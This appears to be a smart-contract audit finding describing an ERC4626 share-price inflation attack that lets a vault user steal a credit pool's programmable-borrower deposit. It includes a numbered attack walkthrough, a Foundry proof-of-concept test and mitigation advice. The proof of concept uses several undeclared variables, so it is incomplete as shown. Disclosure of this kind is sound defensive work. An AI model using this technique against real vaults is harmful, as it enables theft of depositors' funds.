### Title
ERC4626 share-price inflation steals programmable borrower deposits - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` deposits all idle pool assets into its configured ERC4626 vault without enforcing a minimum number of shares or validating that the resulting share position economically represents the deposited assets. If the configured vault is susceptible to share-price inflation—most directly when it is empty or nearly empty—a permissionless vault user can execute the classic first-depositor/donation attack and cause the borrower’s deposit to mint zero shares. The attacker then redeems their shares for both their donation and the borrower’s deposit, leaving the credit pool insolvent while its strategy-token NAV remains intact.

### Finding Description
At epoch start, `onStartEpoch` snapshots the programmable borrower’s total assets before parking all idle underlying into the ERC4626 vault:

```solidity
uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
_depositToVault(underlyingToken.balanceOf(address(this)), 0);
epochStartVaultAssets = startAssets;
``` [1](#0-0) 

`_depositToVault` accepts whatever share amount the external vault returns and applies no lower bound:

```solidity
function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
  if (_assetAmount == 0) return;
  uint256 shares = vault.deposit(_assetAmount, address(this));
  if (epochAccountingActive && _principalAssets != 0) {
    epochDepositedToVault += _principalAssets;
  }
  emit DepositedIntoVault(_assetAmount, shares);
}
``` [2](#0-1) 

For a vault using spot `totalAssets` or `balanceOf(vault)` in `convertToShares`, an attacker can become the first depositor with one wei and directly transfer a large amount of underlying to the vault. That makes each share worth more than the programmable borrower’s deposit. Under integer division, the borrower deposit mints zero shares while the vault retains all deposited assets.

`onStartEpoch` snapshots `epochStartVaultAssets` before the deposit, so this manipulation is not excluded as pre-existing vault PnL. The baseline correctly records the pre-deposit principal, but the contract never verifies that the vault minted economically meaningful shares for that principal. [3](#0-2) 

The subsequent vault accounting is still based on the spot share valuation:

```solidity
uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
``` [4](#0-3) 

When the stolen deposit leaves `epochStartVaultAssets = D` and `_currentVaultAssets() = 0`, `_vaultNetInterest` reports a loss of `D`, while `totalInterestDueNow` clamps the pool-facing result to zero. [5](#0-4)  The `IdleCreditVault` strategy tokens held by the CDO remain outstanding, so CDO NAV does not automatically reflect that the programmable borrower’s vault sleeve has already lost the underlying principal. [6](#0-5) 

### Impact Explanation
An unprivileged ERC4626 vault user can steal the entire first programmable-borrower deposit.

Example:

1. Configure `ProgrammableBorrower` to use an empty spot-liquidity ERC4626 vault.
2. The attacker deposits `1` underlying and receives `1` share.
3. The attacker transfers `X` underlying directly to the vault. One share is now backed by `X + 1` assets.
4. The pool starts an epoch and sends `D` underlying to `ProgrammableBorrower`.
5. `ProgrammableBorrower` deposits `D`, but receives:

   `shares = floor(D * 1 / (X + 1))`

   For `X >= D`, this mints zero shares.
6. The attacker redeems their one share for `D + X + 1`, recovering their `X + 1` cost and profiting `D`.
7. The CDO still holds roughly `D` strategy tokens, but the programmable borrower owns no vault position backing them. Withdrawals and future settlement become undercollateralized.

This is direct theft of LP principal and causes a `D`-unit solvency deficit. The impact is bounded only by the amount routed through the borrower’s first vault deposit.

### Likelihood Explanation
The attack requires the configured ERC4626 vault to be permissionlessly depositable and susceptible to share-price inflation, typically because it has zero or very low share supply and lacks virtual-share/virtual-asset protection. The prompt explicitly allows the attacker to be a user of the programmable borrower’s ERC4626 vault, so no privileged or borrower action is required.

The owner or manager merely performs the normal `startEpoch` flow. During epoch start, pool funds are sent to the borrower and the programmable-borrower hook is invoked to deploy idle liquidity. [7](#0-6)  `onStartEpoch` can only be called by the configured CDO, but the attacker does not need to call it; they only manipulate the vault’s spot exchange rate before the honest manager starts the epoch. [8](#0-7) 

Likelihood is lower if production only permits an ERC4626 vault with substantial pre-existing liquidity or inflation-resistant virtual shares. It is high for a newly deployed or empty compatible vault.

### Recommendation
Do not accept an unconstrained ERC4626 mint result.

In `_depositToVault`:

- require `shares != 0`;
- preview or calculate an accepted share range before deposit;
- require `vault.convertToAssets(shares)` to cover the deposited assets within a bounded rounding tolerance;
- preferably restrict the integration to vaults using virtual shares/assets or another inflation-resistant exchange-rate design;
- for a vault’s first deposit, require protocol-owned dead shares or use a vault implementation that already locks initial liquidity.

A post-deposit solvency assertion should also compare the newly held shares’ asset value with `_assetAmount`. Reverting the deposit is preferable to recording principal that cannot be recovered.

### Proof of Concept
The following Foundry test demonstrates the deposit-minting failure with a deliberately spot-priced ERC4626. In the fork PoC, deploy the real configured vault, have `attacker` seed and inflate it before `startEpoch`, then let the honest manager call `startEpoch`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract InflatableERC4626 is ERC20 {
    using SafeERC20 for IERC20;

    IERC20 public immutable asset;

    constructor(IERC20 _asset) ERC20("Vault Share", "vSHARE") {
        asset = _asset;
    }

    function totalAssets() public view returns (uint256) {
        return asset.balanceOf(address(this));
    }

    function convertToShares(uint256 assets) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? assets : assets * supply / totalAssets();
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? shares : shares * totalAssets() / supply;
    }

    function deposit(uint256 assets, address receiver)
        external
        returns (uint256 shares)
    {
        shares = convertToShares(assets);
        asset.safeTransferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        if (msg.sender != owner) {
            _spendAllowance(owner, msg.sender, shares);
        }

        assets = convertToAssets(shares);
        _burn(owner, shares);
        asset.safeTransfer(receiver, assets);
    }
}

contract ProgrammableBorrowerInflationPoC is Test {
    IERC20 asset;
    InflatableERC4626 vault;
    address attacker = makeAddr("attacker");

    function testFirstDepositorStealsEpochDeposit() public {
        uint256 donation = 10_000e6;
        uint256 poolDeposit = 10_000e6;

        // 1. Attacker becomes the first vault depositor and inflates share price.
        deal(address(asset), attacker, donation + 1);
        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        asset.transfer(address(vault), donation);
        vm.stopPrank();

        assertEq(vault.convertToAssets(1), donation + 1);

        // 2. Honest manager starts the epoch. ProgrammableBorrower receives
        // `poolDeposit` and calls `vault.deposit(poolDeposit, pb)`.
        //
        // In repository terms this reaches:
        // ProgrammableBorrower._depositToVault(poolDeposit, 0).
        deal(address(asset), programmableBorrower, poolDeposit);
        vm.prank(programmableBorrower);
        asset.approve(address(vault), type(uint256).max);
        vm.prank(programmableBorrower);
        uint256 minted = vault.deposit(poolDeposit, programmableBorrower);

        // `poolDeposit * 1 / (donation + 1) == 0`.
        assertEq(minted, 0);
        assertEq(vault.balanceOf(programmableBorrower), 0);

        // 3. Attacker redeems their single share for the donation plus pool deposit.
        uint256 attackerBefore = asset.balanceOf(attacker);
        vm.prank(attacker);
        uint256 stolen = vault.redeem(
            vault.balanceOf(attacker),
            attacker,
            attacker
        );

        assertEq(stolen, donation + 1 + poolDeposit);
        assertEq(
            asset.balanceOf(attacker) - attackerBefore,
            donation + 1 + poolDeposit
        );

        // 4. ProgrammableBorrower recorded `poolDeposit` as epoch principal but
        // owns no vault assets. `vaultLoss()` is `poolDeposit` and
        // `totalInterestDueNow()` is zero.
        assertEq(pb.vaultSharesBalance(), 0);
        assertEq(pb.vaultLoss(), poolDeposit);
        assertEq(pb.totalInterestDueNow(), 0);
    }
}
```

Expected result: the programmable borrower deposits `poolDeposit`, receives zero vault shares, and loses all `poolDeposit` to the attacker. The pool’s strategy-token claims remain outstanding even though the vault sleeve contains no assets backing them.

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L201-203)
```text
  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L213-220)
```text
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L330-347)
```text
  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
  }

  /// @notice Compute the net vault delta split into interest and loss (mutually exclusive).
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-384)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/IdleCDOCreditVault.sol (L125-137)
```text
  function getContractValue() public override view returns (uint256) {
    // Credit vault strategy tokens are minted 1:1 with underlyings and use the same decimals.
    return _contractTokenBalance(strategyToken) + _contractTokenBalance(token) - unclaimedFees;
  }

  /// @notice Calculates the current managed net TVL.
  /// @dev Raw underlyings held by the CDO are excluded because unsolicited transfers are skimmed on interactions.
  /// @return Strategy-token-backed TVL net of accrued fees.
  function _managedContractValue() internal virtual view returns (uint256) {
    uint256 strategyTokenBalance = _contractTokenBalance(strategyToken);
    uint256 fees = unclaimedFees;
    return strategyTokenBalance > fees ? strategyTokenBalance - fees : 0;
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L293-302)
```text
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
    } catch {
      // The borrower did not receive the funds, so keep the strategy-token backing in the strategy.
      _transferUnderlyings(address(_strategy), _toBorrower);
      _strategy.reserveDefaultRecovery(_toBorrower);
      _handleBorrowerDefault(_toBorrower);
```
